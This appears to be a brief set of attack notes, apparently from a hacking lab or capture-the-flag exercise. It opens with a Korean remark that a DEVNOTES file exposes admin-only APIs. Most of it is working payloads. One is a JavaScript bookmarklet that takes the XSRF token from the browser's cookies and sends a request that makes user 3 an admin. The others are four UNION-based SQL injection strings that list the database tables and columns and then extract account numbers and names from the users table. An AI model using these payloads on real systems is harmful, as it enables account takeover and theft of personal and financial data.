DEVNOTES 관리자 전용 API가 담겨있음
(특히 계정 생성 API는 공격자가 이용할 거임)

javascript:(async()=>{ const c=document.cookie.split('; ').find(x=>x.startsWith('XSRF-TOKEN=')); const t=c?.split('=').slice(1).join('='); await fetch('/api/user/role/3/admin', {method:'PATCH',credentials:'include',headers:{'Content-Type': 'application/json', 'X-Request-Id': crypto.randomUUID(), 'X-Request-Time': new Date().toISOString(), 'XSRF-TOKEN':decodeURIComponent(t)},body:JSON.stringify({'role':'ADMIN'})})})()

{
"apiUrl" : "' ) UNION SELECT DISTINCT ROW_NUMBER() OVER(), table_name, null, null, null FROM information_schema.tables WHERE table_schema = DATABASE() #"
}

{
"apiUrl" : "' ) UNION SELECT DISTINCT ROW_NUMBER() OVER(), column_name, null, null, null FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users' #"
}

{
"apiUrl" : "' ) UNION SELECT DISTINCT ROW_NUMBER() OVER(), account_num, null, null, null FROM users #"
}

{
"apiUrl" : "' ) UNION SELECT DISTINCT ROW_NUMBER() OVER(), name, null, null, null FROM users #"
}

